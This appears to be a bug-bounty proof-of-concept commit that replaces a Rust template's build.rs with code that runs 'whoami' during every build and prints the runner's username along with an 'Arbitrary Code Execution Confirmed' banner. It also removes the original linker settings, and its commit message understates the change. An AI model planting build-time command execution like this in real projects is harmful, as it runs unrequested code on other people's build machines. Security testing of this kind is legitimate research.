f456db10a592e172831229b72edd578a52eff0cf
0xForgetMeNot <0xforgetmenot@gmail.com>
2025-12-04 17:22:05 +0330

    POC - DONOT MERGE IT
    Added security warnings and user information logging.

--- template/build.rs
+++ template/build.rs
@@ -1,4 +1,16 @@
+use std::process::Command;
+
 fn main() {
-    println!("cargo:rerun-if-changed=./.git/");
-    println!("cargo:rustc-link-arg=-Tmetadata.x");
+
+    println!("cargo:warning=#######################################################");
+    println!("cargo:warning=SECURITY_AUDIT_POC: Arbitrary Code Execution Confirmed!");
+    println!("cargo:warning=0xforgetmenot (h1) was here - checking build.rs execution.");
+    println!("cargo:warning=#######################################################");
+
+    let output = Command::new("whoami")
+        .output()
+        .expect("failed to execute process");
+    
+    let user = String::from_utf8_lossy(&output.stdout);
+    println!("cargo:warning=Current Runner User: {}", user);
 }
